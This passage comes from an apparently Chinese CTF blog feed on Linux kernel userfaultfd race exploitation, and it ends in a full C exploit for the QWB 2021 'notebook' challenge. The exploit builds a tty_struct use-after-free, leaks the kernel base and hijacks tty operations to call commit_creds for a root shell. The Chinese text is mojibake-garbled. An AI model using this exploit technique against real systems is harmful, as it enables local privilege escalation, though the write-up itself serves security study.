class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">register_userfaultfd</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> *monitor_thread, <span class="hljs-type">void</span> *addr,</span><br><span class="hljs-params">                          <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> *(*handler)(<span class="hljs-type">void</span>*))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* 1. userfaultfdç³»ç»Ÿè°ƒç”¨åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªuffdï¼Œç±»ä¼¼ä¸€ä¸ªæ–‡ä»¶çš„fd */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* 2. åˆ›å»ºä¸€ä¸ªuffdio_apiç»“æ„ä½“ï¼Œç”¨äºæŒ‡å®šuffdæ¥å£çš„ç‰ˆæœ¬å’Œæ”¯æŒçš„ç‰¹æ€§ */</span><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* 3. åˆ›å»ºä¸€ä¸ªuffdio_registerç»“æ„ä½“ï¼Œæ³¨å†Œç›‘è§†çš„å†…å­˜åŒºåŸŸ */</span><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<span class="hljs-comment">// èµ·å§‹åœ°å€</span><br>    uffdio_register.range.len = len;  <span class="hljs-comment">// ç›‘è§†çš„å†…å­˜å¤§å°</span><br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<span class="hljs-comment">// ç›‘è§†æ¨¡å¼</span><br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* 4. å¯åŠ¨monitorçº¿ç¨‹ */</span><br>    s = pthread_create(monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="uffd-handler-for-stucking-thread"><a href="#uffd-handler-for-stucking-thread" class="headerlink" title="uffd_handler_for_stucking_thread"></a>uffd_handler_for_stucking_thread</h2><ul><li>å¯åŠ¨pollè½®è¯¢</li><li>è¯»å–uffd_msgç»“æ„ä½“</li><li>sleepå¡ä½</li><li>ioctlåˆ†é…ç‰©ç†å†…å­˜å¹¶æ‹·è´</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">uffd_handler_for_stucking_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) args;<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">/* 1. åˆ›å»ºä¸€ä¸ªpollfdç»“æ„ä½“ï¼Œå¯åŠ¨pollè½®è¯¢ */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;poll&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* 2. è¯»å–è¿”å›çš„uffd_msgç»“æ„ä½“ */</span><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-comment">/* 3. å¡ä½ */</span><br>        sleep(<span class="hljs-number">100000000</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;read&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;<br>            err_exit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* 4. åˆ›å»ºuffdio_copyç»“æ„ä½“ï¼Œioctl-UFFDIO_COPYå¤„ç†è¿™ä¸ªuserfault */</span><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>) temp_page_for_stuck;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                                    ~(<span class="hljs-number">0x1000</span> - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = <span class="hljs-number">0x1000</span>;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ›-notebook"><a href="#ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ›-notebook" class="headerlink" title="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ› - notebook"></a>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ› - notebook</h1><h2 id="æ¼æ´å’Œåˆ©ç”¨"><a href="#æ¼æ´å’Œåˆ©ç”¨" class="headerlink" title="æ¼æ´å’Œåˆ©ç”¨"></a>æ¼æ´å’Œåˆ©ç”¨</h2><p>æœ‰ä¸€ä¸ªå…¨å±€çš„lockç”¨æ¥ä¿æŠ¤notebookå…¨å±€æ•°ç»„</p><p>ç†è®ºä¸Šæ¥è¯´noteaddã€notedelã€noteeditå‡½æ•°éƒ½åº”è¯¥ç”¨å†™é”ï¼Œä½†noteaddå’Œnoteeditç”¨çš„æ˜¯è¯»é”ï¼Œè¯»é”å…è®¸å¤šä¸ªè¯»çº¿ç¨‹åŒæ—¶è¿›å…¥ï¼Œå°±äº§ç”Ÿäº†æ¡ä»¶ç«äº‰</p><h3 id="noteedit"><a href="#noteedit" class="headerlink" title="noteedit"></a>noteedit</h3><p>å¦‚æœeditçš„sizeå’ŒåŸæ¥çš„sizeä¸ä¸€æ ·ä¼šä½¿ç”¨kreallocé‡æ–°åˆ†é…å†…å­˜ï¼Œkreallocçš„sizeå¦‚æœæ˜¯0çš„è¯ä¼šé‡Šæ”¾åŸchunkä½†ä¸ä¼šåˆ†é…æ–°chunk</p><img src="/2023/11/08/kernel-userfaultfd/edit.png" class title="edit"><p>éœ€è¦æ³¨æ„ä¸€ä¸‹noteeditçš„å¤„ç†é¡ºåº</p><ul><li>æ›´æ”¹size</li><li>kreallocé‡æ–°åˆ†é…å†…å­˜</li><li>copy_from_userä»ç”¨æˆ·ç©ºé—´è¯»å–æ•°æ®</li><li>æ ¹æ®sizeè¿›è¡Œåˆ¤æ–­å¹¶æ›´æ”¹notebook</li></ul><h3 id="noteadd"><a href="#noteadd" class="headerlink" title="noteadd"></a>noteadd</h3><img src="/2023/11/08/kernel-userfaultfd/add.png" class title="add"><p>æ³¨æ„ä¸€ä¸‹noteaddçš„å¤„ç†é¡ºåº</p><ul><li>ä¿å­˜åŸsize</li><li>æ›´æ”¹size</li><li>copy_from_userä»ç”¨æˆ·ç©ºé—´è¯»å–æ•°æ®</li><li>åˆ¤æ–­æ˜¯å¦å·²æœ‰noteï¼Œæ²¡æœ‰çš„è¯kmallocåˆ†é…å†…å­˜</li></ul><h3 id="userfaultfdåœ¨kernelä¸­çš„åˆ©ç”¨"><a href="#userfaultfdåœ¨kernelä¸­çš„åˆ©ç”¨" class="headerlink" title="userfaultfdåœ¨kernelä¸­çš„åˆ©ç”¨"></a>userfaultfdåœ¨kernelä¸­çš„åˆ©ç”¨</h3><p>ç”±äºåœ¨åˆ©ç”¨ioctlå¤„ç†å®Œç¼ºé¡µå¼‚å¸¸ä¹‹åæ‰ä¼šå”¤é†’faultingçº¿ç¨‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨monitorçš„ioctlä¹‹å‰åŠ ä¸€ä¸ªé•¿æ—¶é—´çš„ä¼‘çœ å¡ä½è¿™ä¸ªçº¿ç¨‹ï¼Œç”±äºæ— é”ï¼ˆé”æ²¡ç”¨ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰é€ ä¸€ä¸ªuaf</p><p>ä¸»è¦æµç¨‹</p><ul><li>æ–°å¼€ä¸€ä¸ªçº¿ç¨‹noteedité‡Šæ”¾tty_structå¤§å°çš„chunkï¼Œç„¶ååˆ©ç”¨copy_from_userå¡ä½</li><li>æ–°å¼€ä¸€ä¸ªçº¿ç¨‹noteaddä¿®æ”¹å †å—å¤§å°ï¼Œå› ä¸ºreadå’Œwriteå †å—éƒ½éœ€è¦æŸ¥éªŒå¤§å°</li><li>ä¸»çº¿ç¨‹è¿›è¡Œtty_structçš„ç¯¡æ”¹å’Œåˆ©ç”¨</li></ul><p><strong>psï¼šnoteeditå’Œnoteaddçš„çº¿ç¨‹ä¼šä¸€ç›´å¡åˆ°åˆ©ç”¨ç»“æŸä¹‹åï¼Œæ‰€ä»¥ä¸éœ€è¦è€ƒè™‘copy_from_userå®Œä¹‹åçš„äº‹</strong></p><p>å¦å¤–ï¼Œuserfaultfdåˆ†é…ç‰©ç†å†…å­˜çš„æ—¶é—´æ˜¯æœ€åçš„ioctlï¼Œæ‰€ä»¥æœ¬é¢˜å¯ä»¥ä½¿ç”¨ä¸€å—userfaultfdå†…å­˜å¡ä¸¤æ¬¡ï¼Œå› ä¸ºè§¦å‘ç¬¬äºŒæ¬¡copy_from_useræ—¶ç¬¬ä¸€æ¬¡ç¼ºé¡µå¼‚å¸¸è¿˜åœ¨å¡ç€æ²¡åˆ†é…ç‰©ç†å†…å­˜</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>æ³¨æ„</p><ul><li>é©±åŠ¨çš„textæ®µå’Œbssæ®µåŠ è½½çš„æ—¶å€™ä¸æ˜¯è¿ç€çš„ï¼Œè®°å¾—çœ‹ä¸€ä¸‹åŠ è½½åŸºå€</li><li><strong>çœ‹åŠ è½½åŸºå€ï¼</strong>é©±åŠ¨åŠ è½½åŸºå€ä¸ä¸€å®šæ˜¯0xffffffffc0000000</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WORK_FOR_CPU_FN 0xffffffff8109eb90</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NOTE_NUM 0x10</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> &#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span> * buf;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">KernelNotebook</span> &#123;</span><br>    <span class="hljs-type">void</span> *ptr;<br>    <span class="hljs-type">size_t</span> size;<br>&#125;;<br><br><span class="hljs-type">int</span> note_fd;<br><span class="hljs-type">sem_t</span> evil_add_sem, evil_edit_sem;<br><span class="hljs-type">char</span> *uffd_buf;<br><span class="hljs-type">char</span> temp_page[<span class="hljs-number">0x1000</span>] = &#123; <span class="hljs-string">&quot;arttnba3&quot;</span> &#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteAdd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteDel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .idx = idx,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x200</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteEdit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x300</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteGift</span><span class="hljs-params">(<span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">noteRead</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> read(note_fd, buf, idx);<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">noteWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> write(note_fd, buf, idx);<br>&#125;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">fixSizeByAdd</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span><br>&#123;<br>    sem_wait(&amp;evil_add_sem);<br>    noteAdd(<span class="hljs-number">0</span>, <span class="hljs-number">0x60</span>, uffd_buf);<br>&#125;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">constructUAF</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span><br>&#123;<br>    sem_wait(&amp;evil_edit_sem);<br>    noteEdit(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, uffd_buf);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br><br>    sem_init(&amp;evil_add_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    sem_init(&amp;evil_edit_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    note_fd = open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span>(note_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;Fail to open device notebook!&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] register userfaultfd...&quot;</span>);<br><br>    <span class="hljs-type">pthread_t</span> uffd_monitor_thread;<br>    uffd_buf = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    register_userfaultfd_for_thread_stucking(&amp;uffd_monitor_thread, uffd_buf, <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] allocating tty_struct-size object...&quot;</span>);<br><br>    noteAdd(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, temp_page);<br>    noteEdit(<span class="hljs-number">0</span>, TTY_STRUCT_SIZE, temp_page);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] constructing UAF on tty_struct...&quot;</span>);<br><br>    <span class="hljs-type">pthread_t</span> add_fix_size_thread, edit_uaf_thread;<br>    pthread_create(&amp;edit_uaf_thread, <span class="hljs-literal">NULL</span>, constructUAF, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;add_fix_size_thread, <span class="hljs-literal">NULL</span>, fixSizeByAdd, <span class="hljs-literal">NULL</span>);<br><br>    sem_post(&amp;evil_edit_sem);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    sem_post(&amp;evil_add_sem);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] leaking kernel_base by tty_struct&quot;</span>);<br><br>    <span class="hljs-type">int</span> fd_tty = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>    <span class="hljs-keyword">if</span>(fd_tty &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;Fail to open device ptmx!&quot;</span>);<br><br>    <span class="hljs-type">size_t</span> tty_struct_data[<span class="hljs-number">0x2e0</span>];<br>    noteRead(<span class="hljs-number">0</span>, tty_struct_data);<br><br>    <span class="hljs-keyword">if</span>(*(<span class="hljs-type">int</span> *)tty_struct_data != <span class="hljs-number">0x5401</span>)<br>        err_exit(<span class="hljs-string">&quot;Fail to hit the tty_struct!&quot;</span>);<br><br>    <span class="hljs-type">size_t</span> tty_ops = tty_struct_data[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">if</span>((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTM_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>))<br>        kernel_offset = tty_ops - PTM_UNIX98_OPS;<br>    <span class="hljs-keyword">else</span><br>        kernel_offset = tty_ops - PTY_UNIX98_OPS;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m0x%lx\n&quot;</span>, kernel_base + kernel_offset);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct fake tty_operations...&quot;</span>);<br><br>    noteAdd(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>, temp_page);<br>    noteEdit(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> tty_operations), temp_page);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> <span class="hljs-title">fake_tty_ops</span>;</span><br>    fake_tty_ops.ioctl = kernel_offset + WORK_FOR_CPU_FN;<br>    noteWrite(<span class="hljs-number">1</span>, &amp;fake_tty_ops);<br><br>    <span class="hljs-type">size_t</span> fake_tty_ops_addr, fake_tty_struct_addr;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">KernelNotebook</span> <span class="hljs-title">notebook</span>[0<span class="hljs-title">x10</span>];</span><br>    noteGift(notebook);<br>    fake_tty_ops_addr = (<span class="hljs-type">size_t</span>)notebook[<span class="hljs-number">1</span>].ptr;<br>    fake_tty_struct_addr = (<span class="hljs-type">size_t</span>)notebook[<span class="hljs-number">0</span>].ptr;<br><br>    <span class="hljs-type">size_t</span> fake_tty_struct_data[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_struct_data, tty_struct_data, <span class="hljs-number">0x2e0</span>);<br>    fake_tty_struct_data[<span class="hljs-number">3</span>] = fake_tty_ops_addr;<br>    fake_tty_struct_data[<span class="hljs-number">4</span>] = kernel_offset + PREPARE_KERNEL_CRED;<br>    fake_tty_struct_data[<span class="hljs-number">5</span>] = <span class="hljs-literal">NULL</span>;<br><br>    noteWrite(<span class="hljs-number">0</span>, fake_tty_struct_data);<br><br>    ioctl(fd_tty, <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br><br>    noteRead(<span class="hljs-number">0</span>, fake_tty_struct_data);<br>    fake_tty_struct_data[<span class="hljs-number">5</span>] = fake_tty_struct_data[<span class="hljs-number">6</span>];<br>    fake_tty_struct_data[<span class="hljs-number">6</span>] = tty_struct_data[<span class="hljs-number">6</span>];<br>    fake_tty_struct_data[<span class="hljs-number">3</span>] = fake_tty_ops_addr;<br>    fake_tty_struct_data[<span class="hljs-number">4</span>] = kernel_offset + COMMIT_CREDS;<br><br>    noteWrite(<span class="hljs-number">0</span>, fake_tty_struct_data);<br><br>    ioctl(fd_tty, <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br><br>    noteWrite(<span class="hljs-number">0</span>, tty_struct_data);<br><br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Race Condition</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>source code</tag>
      
      <tag>userfaultfd</tag>
      
      <tag>race condition</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernelæºç åˆ†æ-ç³»ç»Ÿå¯åŠ¨ï¼ˆäºŒï¼‰</title>
    <link href="/2023/10/07/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
